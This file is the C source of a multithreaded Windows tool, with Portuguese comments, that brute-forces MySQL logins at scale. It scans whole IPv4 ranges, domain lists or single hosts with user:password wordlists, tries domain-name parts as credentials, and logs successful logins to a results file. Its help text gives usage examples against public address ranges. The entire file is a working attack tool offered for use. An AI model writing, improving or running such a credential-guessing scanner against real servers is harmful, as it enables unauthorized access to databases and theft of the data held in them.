
/**
 * File:   MySQL-Brute.c
 * Author: Jesse aka Constantine
 *
 * My GitHub: https://github.com/jessesilva
 * P0cL4bs Team GitHub: https://github.com/P0cL4bs
 * 
 * Criado junho de 2015.
 * 
 * Aplicação utilizada para fazer brute force de servidores MySQL em massa.
 * Opções disponíveis...
 *   + Utilizar domínios (lista com nomes dos domínios: host.com).
 *   + Utilizar faixa de IP (lista de texto: user;pass).
 * 
 * Dependencias.
 *  MySQL Library, https://dev.mysql.com/downloads/connector/c/6.1.html
 * 
 * Compilação.
 *  gcc MySQL-Brute.c -Iinclude -o MySQL-Brute.exe lib/libmysql.lib && MySQL-Brute.exe
 * 
 * Testado no Windows 7.
 */

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <mysql.h>

#define DEFAULT_RESULT_FILE "result.txt"
#define alloc_copy(DST,SRC) \
DST = (unsigned char *) xmalloc((strlen(SRC)*sizeof(unsigned char))+1); \
memcpy(DST, SRC, strlen(SRC));
#define zero(PTR,SIZE) memset(PTR, '\0', SIZE)

#define out     printf
#define TRUE    1
#define FALSE   0
#define MAX     256

typedef struct {
    unsigned char *target_host;
    unsigned char *list_of_domain;
    unsigned char *list_of_user_and_pass;
    unsigned char *ip_range;
    unsigned char *output_file;
    unsigned int number_of_threads;
    unsigned int mysql_port;
    unsigned int timeout;
} argument_t;

typedef struct {
    unsigned char *host;
    unsigned char *user;
    unsigned char *pass;
    unsigned int port;
    unsigned int timeout;
} param_t;

typedef struct {
    unsigned int thread_control;
    unsigned int thread_counter;
    unsigned int threads_active;
} thread_t;

typedef struct {
    unsigned int total_connection_success;
    unsigned int total_connection_error;
    unsigned int total_target_tested;
} statistic_t;

static argument_t *argument;
static thread_t *thread;
static statistic_t *statistic;

static void show_banner (const unsigned char *argv, const unsigned int banner_id);
static unsigned int connect_in_server (const unsigned char *server, const unsigned int port, 
        const unsigned char *user, const unsigned char *pass, const unsigned int timeout);
static void core (const unsigned int scanner_mode);
static void *xmalloc (const unsigned int size);
static unsigned int file_exists (const unsigned char *path);
static void thread_loop (const void *tparam);
static unsigned int check_ip_range (const unsigned char *range);
static unsigned int check_target (const unsigned char *target);
static void save (const unsigned char *host, const int unsigned port, 
        const unsigned char *user, const unsigned char *pass);
static void show_statistics (void);
static void check_domain_algorithm (const unsigned char *host);

int main (int argc, char** argv) {
    unsigned int scanner_mode = 0;
    
    argument = xmalloc(sizeof(argument_t));
    argument->target_host = NULL;
    argument->list_of_domain = NULL;
    argument->list_of_user_and_pass = NULL;
    argument->ip_range = NULL;
    argument->output_file = NULL;
    argument->number_of_threads = 1;
    argument->mysql_port = 3306;
    argument->timeout = 3;
    
    thread = xmalloc(sizeof(thread_t));
    thread->thread_control = 0;
    thread->thread_counter = 0;
    thread->threads_active = FALSE;
    
    statistic = xmalloc(sizeof(statistic_t));
    statistic->total_connection_error = 0;
    statistic->total_connection_success = 0;
    statistic->total_target_tested = 0;
    
    if (argc > 2) {
        for (int a=0; argv[a]; a++)
            if (strcmp(argv[a], "-h") == 0) {
                alloc_copy(argument->target_host, argv[a+1]);
            } else if (strcmp(argv[a], "-l") == 0 && argv[a+1]) {
                alloc_copy(argument->list_of_domain, argv[a+1]);
            } else if (strcmp(argv[a], "-b") == 0 && argv[a+1]) {
                alloc_copy(argument->list_of_user_and_pass, argv[a+1]);
            } else if (strcmp(argv[a], "-f") == 0 && argv[a+1]) {
                alloc_copy(argument->ip_range, argv[a+1]);
            }else if (strcmp(argv[a], "-o") == 0 && argv[a+1]) {
                alloc_copy(argument->output_file, argv[a+1]);
            } else if (strcmp(argv[a], "-t") == 0 && argv[a+1])
                argument->number_of_threads = atoi(argv[a+1]);
            else if (strcmp(argv[a], "-p") == 0 && argv[a+1])
                argument->mysql_port = atoi(argv[a+1]);
            else if (strcmp(argv[a], "-c") == 0 && argv[a+1])
                argument->timeout = atoi(argv[a+1]);
             
        if (((argc-1) % 2) == 0)
            if (argument->ip_range != NULL && argument->list_of_user_and_pass != NULL &&
                argument->target_host == NULL && argument->list_of_domain == NULL)
                scanner_mode = 1;
            else if (argument->list_of_domain != NULL && argument->ip_range == NULL &&
                     argument->list_of_user_and_pass != NULL && argument->target_host == NULL)
                scanner_mode = 2;
            else if (argument->target_host != NULL && argument->list_of_user_and_pass != NULL &&
                     argument->ip_range == NULL)
                scanner_mode = 3;
        
        if (argument->output_file == NULL) {
            char temporary [] = DEFAULT_RESULT_FILE;
            argument->output_file = (unsigned char *) xmalloc(strlen(temporary) + 1);
            memcpy(argument->output_file, temporary, strlen(temporary));
        }
        
        thread->thread_control = argument->number_of_threads;
    }
    
    if (scanner_mode) {
        core(scanner_mode);
    }
    else {
        show_banner(NULL, 1);
        show_banner(argv[0], 2);
    }
    
    return EXIT_SUCCESS;
}

/**
 * Núcleo da aplicação.
 * 
 * @param  scanner_mode   Método de scaneamento.
 *                         1: Bruta por faixa de IP.
 *                         2: Bruta lista de domínios.
 *                         3: Bruta host específico.
 */
static void core (const unsigned int scanner_mode) {
    unsigned char user [MAX], pass [MAX], line [MAX];
    unsigned char temporary [MAX];
    FILE *fp = NULL;
    
    show_banner(NULL, 1);
    out(" Starting...\n\n");
    
    if (file_exists(argument->list_of_user_and_pass) == FALSE) {
        out("List of username and password not exists.\n"
            "File %s not exists.\n", argument->list_of_user_and_pass);
        return;
    }
    
    if ((fp = fopen(argument->list_of_user_and_pass, "r")) != NULL) {
        switch (scanner_mode) {

        #define parser_user_and_pass \
            zero(user, MAX); zero(pass, MAX); \
            for (int a=0,b=0,c=0; line[a]!='\0'; a++) { \
            if (line[a] == '\n') { pass[c] = '\0'; break; } \
            if (line[a] == ':') { user[a] = '\0'; b = 1; a++; } \
            if (b) { pass[c] = line[a]; c++; }  \
            else user[a] = line[a]; }

        #define open_my_thread \
            param_t *param = (param_t *) xmalloc(sizeof(param_t)); \
            alloc_copy(param->user, user); \
            alloc_copy(param->pass, pass); \
            alloc_copy(param->host, temporary); \
            param->port = argument->mysql_port; \
            param->timeout = argument->timeout; \
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) thread_loop, (void *) param, 0, 0); \
            thread->threads_active = TRUE; \
            thread->thread_control--; \
            thread->thread_counter++; \
            statistic->total_target_tested++;
        
        #define while_repeat_thread_range \
            fseek(fp, 0, SEEK_SET); \
            while (fgets(line, MAX, fp) != NULL) { \
                parser_user_and_pass \
                while (TRUE) \
                    if (thread->thread_control) { \
                        if (strlen(user)>0 && strlen(pass)>0) { \
                            open_my_thread; \
                        } break; \
                    } }
        
        /* IPv4 range. */
        case 1: {
            int counter = 0;
            for (int a=0; argument->ip_range[a]!='\0'; a++)
                if (argument->ip_range[a] == '.') counter++;
            
            if (check_ip_range(argument->ip_range) == FALSE) {
                out("Invalid IP range.\n");
                break;
            } else if (counter == 0) {
                if (((int) strtol(argument->ip_range, (char **)0, 10)) > 255) {
                    out("Range limit is 255.\n");
                    break;
                }
            } 
            
            #define check_range_method(METHOD) \
                int status = FALSE; \
                for (int a=0,b=0; ; a++) { \
                    if (argument->ip_range[a] == '.' || b == 4) { \
                        temporary[(b) ? (b-1) : a] = '\0'; \
                        if (((int) strtol(temporary, (char **)0, 10)) > 255) { \
                            status = TRUE; \
                            break; \
                        } else { \
                            if (METHOD == 1) \
                                if (b == 4) { b = 0; } \
                            if (b) b++; \
                            if (b == 0) { b = 1; a++; } \
                        } \
                    } \
                    temporary[ (b) ? (b-1) : a ] = argument->ip_range[ a ]; \
                    if (b) b++; \
                    if (argument->ip_range[a] == '\0') break; \
                } \
                if (status) { \
                    out("Range limit is 255.\n"); \
                    break; }
            
            else if (counter == 1) {
                check_range_method(0)
            } else if (counter == 2) {
                check_range_method(1)
            }
            
            zero(temporary, MAX);
            switch (counter) {
            case 0:
                for (int a=0,b=0,c=0; a<=255; c++) {
                    if (c == 255) { c = 0; b++; }
                    if (b == 255) { b = 0; a++; }
                    sprintf(temporary, "%s.%d.%d.%d", argument->ip_range, a, b, c);
                    while_repeat_thread_range
                }
                break;
            case 1: 
                for (int a=0,b=0; a<=255; b++) {
                    if (b == 255) { b = 0; a++; }
                    sprintf(temporary, "%s.%d.%d", argument->ip_range, a, b);
                    while_repeat_thread_range
                }
                break;
            case 2: 
                for (int a=0; a<=255; a++) {
                    sprintf(temporary, "%s.%d", argument->ip_range, a);
                    while_repeat_thread_range
                }
                break;
            default:
                out("Invalid IP range.\n");
            }
        } break;

        /* Bruta lista de domínios. */
        case 2: {
            FILE *fl = NULL;
            if ((fl = fopen(argument->list_of_domain, "r")) != NULL) {
                while (fgets(temporary, MAX, fl) != NULL) {
                    if (check_target(temporary) == FALSE) continue;
                    for (int a=0; temporary[a]!='\0'; a++)
                        if (temporary[a] == '\n') {
                            temporary[a] = '\0';
                            break;
                        }
                    check_domain_algorithm(temporary);
                    while_repeat_thread_range
                }
                fclose(fl);
            }
        } break;
        
        /* Bruta host específico. */
        case 3: {
                zero(temporary, MAX);
                memcpy(temporary, argument->target_host, strlen(argument->target_host));
                if (check_target(temporary) == FALSE) {
                    out("Invalid host: %s.\n", temporary);
                    break;
                }
                check_domain_algorithm(temporary);
                while_repeat_thread_range
            } break;
        }
        fclose(fp);
    }
    
    if (thread->threads_active)
        while (TRUE)
            if (thread->thread_counter <= 0) break;
        
    show_statistics();
}

/**
 * Função aberta pela thread. Responsável por verificar se é possível 
 * conectar no host, exibir e salvar informações.
 * 
 * @param tparam    Estrutura contendo dados da conexão a ser feita.
 */
static void thread_loop (const void *tparam) {
    param_t *param = (param_t *) tparam;
    
    if (param->host && param->port && param->user && param->pass && param->timeout) {
        out(" - Checking: %s:%d -> %s:%s\n", param->host, param->port, param->user, param->pass);
        if (connect_in_server(param->host, 3306, param->user, param->pass, param->timeout)) {
            out(" + Successfully connected in %s:%d using %s:%s login.\n",
                    param->host, param->port, param->user, param->pass);
            save(param->host, param->port, param->user, param->pass);
            statistic->total_connection_success++;
        } else 
            statistic->total_connection_error++;
    }
    
    param->port = 0;
    param->timeout = 0;
    free(param->host);
    free(param->user);
    free(param->pass);
    free(param);
    thread->thread_control++;
    thread->thread_counter--;
    ExitThread(0);
}

/**
 * Conecta em servidor MySQL.
 * Exemplo de uso...
 *  if (connect_in_server("127.0.0.1", 3306, "root", "senha", 2)) {...
 * 
 * @param server    Endereço do servidor.
 * @param port      Porta do servidor.
 * @param user      Usuário MySQL.
 * @param pass      Senha do usuário MySQL.
 * @param timeout   Tempo de espera da conexão.
 * @return          Se conectar com sucesso retorna TRUE, caso contrário FALSE.
 */
static unsigned int connect_in_server (const unsigned char *server, const unsigned int port, 
        const unsigned char *user, const unsigned char *pass, const unsigned int timeout) {
    unsigned int result = FALSE;
    if (server && port && user && pass) {
        MYSQL *connection = NULL;
        if ((connection = mysql_init(NULL)) != NULL) {
            unsigned int connection_timeout = timeout;
            mysql_options(connection, MYSQL_OPT_CONNECT_TIMEOUT, &connection_timeout);
            if (mysql_real_connect(connection, server, user, pass, NULL, port, 0, 0) != NULL)
                result = TRUE;
            else
                result = FALSE;
            mysql_close(connection);
        }
    }
    return result;
}

/**
 * Algoritmo simples para usar o nome do domínio como usuário e senha.
 * @param host  Host a ser verificado.
 */
static void check_domain_algorithm (const unsigned char *host) {
    if (!host) return;
    unsigned char *target = (unsigned char *) xmalloc(strlen(host) + 1);
    memcpy(target, host, strlen(host));
    
    char *ptr = NULL;
    ptr = strtok(target, ".");
    while (ptr != NULL) {
        while (TRUE)
            if (thread->thread_control) {
                param_t *param = (param_t *) xmalloc(sizeof(param_t));
                alloc_copy(param->user, ptr);
                alloc_copy(param->pass, ptr);
                alloc_copy(param->host, host);
                param->port = argument->mysql_port;
                param->timeout = argument->timeout;
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) thread_loop, (void *) param, 0, 0);
                thread->threads_active = TRUE;
                thread->thread_control--;
                thread->thread_counter++;
                statistic->total_target_tested++;
                break;
            }
        ptr = strtok(NULL, ".");
    }
}

/**
 * Função malloc com tratamento pra verificar se dados foram alocados 
 * e enseguida zerar o buffer.
 * 
 * @param   size    Tamanho dos dados a serem alocados.
 * @return          Ponteiro para alocação.
 */
static void *xmalloc (const unsigned int size) {
    if (size) {
        void *ptr = NULL;
        if ((ptr = malloc(size)) != NULL) {
            memset(ptr, 0, size);
            return ptr;
        }
    }
    return NULL;
}

/**
 * Verifica se determinado arquivo existe.
 * 
 * @param  path  Caminho ou nome do arquivo que será varificado.
 * @return       Se arquivo existir retorna TRUE, caso contrário retorna FALSE.
 */
static unsigned int file_exists (const unsigned char *path) {
    if (path) {
        FILE *fp = NULL;
        if ((fp = fopen(path, "r")) != NULL) {
            fclose(fp);
            return TRUE;
        }
    }
    return FALSE;
}

/**
 * Verifica se range de IP especificada é válida.
 * @param string    Range a ser analisada.
 * @return          Se existir retorna TRUE, caso contrário retora FALSE.
 */
static unsigned int check_ip_range (const unsigned char *range) {
    if (range) {
        int counter = 0;
        for (int a=0; range[a]!='\0'; a++)
            if ((range[a] >= '0' && range[a] <= '9') || range[a] == '.')
                counter++;
        if (counter == strlen(range))
            return TRUE;
    }
    return FALSE;
}

/**
 * Verifica se host alvo é um domínio ou IP válido.
 * 
 * @param   target  Host a ser analisado.
 * @return          Para sucesso TRUE e FALSE em caso de erro.
 */
static unsigned int check_target (const unsigned char *target) {
    if (!target) return FALSE; 
    if (!strlen(target) > 0) return FALSE;
    
    unsigned char *temporary = (unsigned char *) xmalloc(strlen(target)+1);
    memcpy(temporary, target, strlen(target));

    for (int a=0; temporary[a]!='\0'; a++)
        if (temporary[a] == '\n') {
            temporary[a] = '\0';
            break;
        }

    if (strlen(temporary) == 0)
        return FALSE;
    
    if (strstr(temporary, ".")) {
        int counter = 0;
        for (int a=0; temporary[a]!='\0'; a++)
                if (((temporary[a] >= 'a' && temporary[a] <= 'z') ||
                    (temporary[a] >= 'A' && temporary[a] <= 'Z')) || 
                    temporary[a] == '.')
                    counter++;
        if (counter == strlen(temporary))
            return TRUE;
        if (check_ip_range(temporary))
            return TRUE;
    }
    
    return FALSE;
}

/**
 * Salva dados em arquivo de resultados.
 * 
 * @param host  Endereço do servidor MySQL.
 * @param port  Porta do servidor.
 * @param user  Usuário de acesso.
 * @param pass  Senha de acesso.
 */
static void save (const unsigned char *host, const int unsigned port, 
        const unsigned char *user, const unsigned char *pass) {
    if (host && port && user && pass) {
        FILE *fp = NULL;
        if ((fp = fopen(argument->output_file, "a+")) != NULL) {
            fprintf(fp, "Address: %s:%d\nLogin: %s:%s\n\n", host, port, user, pass);
            fclose(fp);
        }
    }
}

/**
 * Exibe statísticas finais.
 */
static void show_statistics (void) {
    out("\n\n Executed threads: %d\n Connections error: %d\n"
        " Successful connections: %d\n\n Finished.\n\n", 
            statistic->total_target_tested, 
            statistic->total_connection_error, 
            statistic->total_connection_success);
}

/**
 * Exibe banner e help.
 * 
 * @param argv        Nome do programa, valor armazenado em argv[0].
 * @param banner_id   Id do banner que será exibido, 1 = Logo, 2 = Help.
 */
static void show_banner (const unsigned char *argv, const unsigned int banner_id) {
    switch (banner_id) {
    case 1:
        out("\n                   ____    _____   __\n"
            "  /'\\_/`\\         /\\  _`\\ /\\  __`\\/\\ \\  Brute Force v1.0 - 06/2015\n"
            " /\\      \\  __  __\\ \\,\\L\\_\\ \\ \\/\\ \\ \\ \\  Coded by Constantine - P0cL4bs Team\n"
            " \\ \\ \\__\\ \\/\\ \\/\\ \\\\/_\\__ \\\\ \\ \\ \\ \\ \\ \\  __\n"
            "  \\ \\ \\_/\\ \\ \\ \\_\\ \\ /\\ \\L\\ \\ \\ \\\\'\\\\ \\ \\L\\ \\     Greatz for L1sbeth\n"
            "   \\ \\_\\\\ \\_\\/`____ \\\\ `\\____\\ \\___\\_\\ \\____/   and all my friends...\n"
            "    \\/_/ \\/_/`/___/> \\\\/_____/\\/__//_/\\/___/\n"
            "                /\\___/   My GitHub: github.com/jessesilva\n"
            "                \\/__/    P0cL4bs Team: github.com/P0cL4bs\n\n");
        break;
    case 2:
        out("\n"
            " -l : List of host (domains or IPs, sintaxy: domain.com or 192.168.1.200).\n"
            " -h : Specific host (domain or IP).\n"
            " -b : List of users and passwords (sintaxy: user:pass).\n"
            " -f : IP range.\n"
            " -p : Port of MySQL service (default: 3306).\n"
            " -t : Number of threads (default: 1).\n"
            " -o : Output file (default: result.txt).\n"
            " -c : Timeout in seconds (default: 3).\n\n"
            " Examples...\n"
            "  Brute specific IP range (200.190.*).\n"
            "   %s -f 200.190 -b user_pass_list.txt -t 20\n\n"
            "  Brute domain list.\n"
            "   %s -l domain_list.txt -b user_pass_list.txt -t 20\n\n"
            "  Brute specific host.\n"
            "   %s -h mysql.host.com -b user_pass_list.txt -t 20 -p 7777\n"
            "  \n", argv, argv, argv);
        break;
    }
}

/* EOF. */
